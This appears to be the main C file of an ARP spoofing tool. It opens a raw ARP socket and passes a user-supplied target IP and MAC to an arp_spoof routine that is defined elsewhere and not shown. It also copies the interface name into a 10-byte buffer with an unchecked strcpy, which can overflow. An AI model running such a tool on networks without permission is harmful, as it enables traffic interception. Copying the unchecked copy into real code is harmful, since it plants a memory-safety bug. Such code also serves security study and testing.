#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <signal.h>
#include <sys/socket.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <netpacket/packet.h>
#include <netinet/if_ether.h>

#include "arp_spoof.h"


int sock;

int main(int argc, char *argv[])
{

  struct getlocal gi;  
  char ifname[10];
  
  if (argc < 4) 
  {
    puts("Usage: ./a.out <interface> <target ip address> <target mac address>");
    exit(1);
  }
  
  printf("input Value \t <interface> : %s \t <ip> : %s \t <mac> : %s \n",argv[1],argv[2],argv[3]);
  
  strcpy(ifname,argv[1]);

  getLocalAddress(ifname, &gi);
  
  sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
  if (sock < 0)
  {
    perror("socket"), exit(1);
  }

 // signal(SIGINT, close_sock);
  arp_spoof(sock, &gi, ifname,argv[2], argv[3]);

  close(sock);

  return 0;
}

void close_sock()
{
  close(sock);
  exit(0);
}